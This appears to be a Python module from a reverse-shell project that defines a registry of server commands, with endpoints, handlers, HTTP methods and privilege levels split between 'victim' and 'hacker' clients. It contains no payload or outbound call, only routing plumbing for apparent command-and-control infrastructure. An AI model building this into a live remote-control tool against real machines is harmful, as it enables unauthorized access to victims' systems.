""" Contains the declaration of the server commands. """

# TODO: Implement Enums for each server command and client_types

from enum import Enum
from http import HTTPMethod
from typing import Any, Callable, Optional, Self
from typing_extensions import TypedDict

import reverse_shell.utils as ut


class ServerCommandPrivilege(list[ut.ClientType], Enum):
    """Used to define privileges of server commands according from what kind of
    client the server can be accessed"""

    victim_level = [ut.ClientType.victim]
    hacker_level = [ut.ClientType.hacker]
    for_all = [ut.ClientType.victim, ut.ClientType.hacker]


class ServerCommandInfoItem(TypedDict):
    endpoint: str
    handler: Callable[..., Any]
    privilege: ServerCommandPrivilege
    method: HTTPMethod


class ServerCommandNotFound(Exception):
    """Exception raised if server command doesn't exist."""

    def __init__(self, command: str):
        self.message = f"The server command `{command}` isn't defined."
        super().__init__(self.message)


class ServerCommands:
    ServerCommandInfo = dict[ut.ServerCommand, ServerCommandInfoItem]

    class Builder:
        def __init__(self) -> None:
            # var that holds the final dict that will be passed
            # to the constructor of the ServerCommands
            self.server_command_info: ServerCommands.ServerCommandInfo = {}

        def add_command(
            self,
            cmd_name: ut.ServerCommand,
            endpoint: str,
            command_handler: Callable[..., Any],
            http_method: HTTPMethod = HTTPMethod.GET,
            privilege: ServerCommandPrivilege = ServerCommandPrivilege.victim_level,
        ) -> Self:
            self.server_command_info[cmd_name] = {
                "endpoint": endpoint,
                "handler": command_handler,
                "method": http_method,
                "privilege": privilege,
            }
            return self

        def build(self):
            return ServerCommands(self.server_command_info)

    def __init__(self, server_command_info: ServerCommandInfo) -> None:
        self.server_command_info = server_command_info

    def search_command(self, command: ut.ServerCommand) -> bool:
        """Search for a command inside the server_command_info"""
        if command in list(self.server_command_info.keys()):
            return True
        return False

    def get_command_endpoint(self, command: ut.ServerCommand) -> str:
        """Get the endpoint of the given `command`"""
        if not self.search_command(command):
            raise ServerCommandNotFound(command)

        return self.server_command_info[command]["endpoint"]

    def get_command_method(self, command: ut.ServerCommand) -> HTTPMethod:
        """Get the HTTP method of the given `command`"""
        if not self.search_command(command):
            raise ServerCommandNotFound(command)

        return self.server_command_info[command]["method"]

    def get_command_handler(self, command: ut.ServerCommand) -> Callable[..., Any]:
        """Get the handler of the given `command`"""
        if not self.search_command(command):
            raise ServerCommandNotFound(command)

        return self.server_command_info[command]["handler"]

    def get_command_privilege(
        self, command: ut.ServerCommand
    ) -> ServerCommandPrivilege:
        """Get the privilege of the given `command`"""
        if not self.search_command(command):
            raise ServerCommandNotFound(command)

        return self.server_command_info[command]["privilege"]

    def check_client_verified_for_cmd(
        self, cmd: ut.ServerCommand, client_type: ut.ClientType
    ) -> bool:
        """Checks if a client is verified to access a server command."""
        return client_type in self.get_command_privilege(cmd).value

    def get_command_by_endpoint(self, endpoint: str) -> Optional[ut.ServerCommand]:
        """Get a server command using it's endpoint"""
        for server_cmd, server_cmd_info in self.server_command_info.items():
            if server_cmd_info["endpoint"] == endpoint:
                return server_cmd
        return None
